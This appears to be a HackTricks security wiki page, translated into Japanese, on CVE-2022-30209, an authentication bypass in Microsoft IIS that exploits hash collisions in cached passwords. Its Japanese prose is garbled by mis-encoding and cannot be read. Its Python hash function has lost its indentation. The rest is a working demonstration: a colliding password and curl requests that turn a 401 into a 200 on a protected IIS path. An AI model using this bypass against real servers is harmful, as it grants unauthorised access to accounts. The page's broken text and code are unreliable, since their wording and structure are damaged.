## ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸIISèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[ã“ã¡ã‚‰ã«å®Œå…¨ãªãƒ¬ãƒãƒ¼ãƒˆãŒã‚ã‚Šã¾ã™](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)ï¼šã‚³ãƒ¼ãƒ‰ã®ãƒã‚°ã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦æä¾›ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’é©åˆ‡ã«ãƒã‚§ãƒƒã‚¯ã—ãªã‹ã£ãŸ**ãŸã‚ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ãŒã‚­ãƒ£ãƒƒã‚·ãƒ¥å†…ã®ã‚­ãƒ¼ã«ãƒ’ãƒƒãƒˆã™ã‚‹**æ”»æ’ƒè€…ã¯ã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
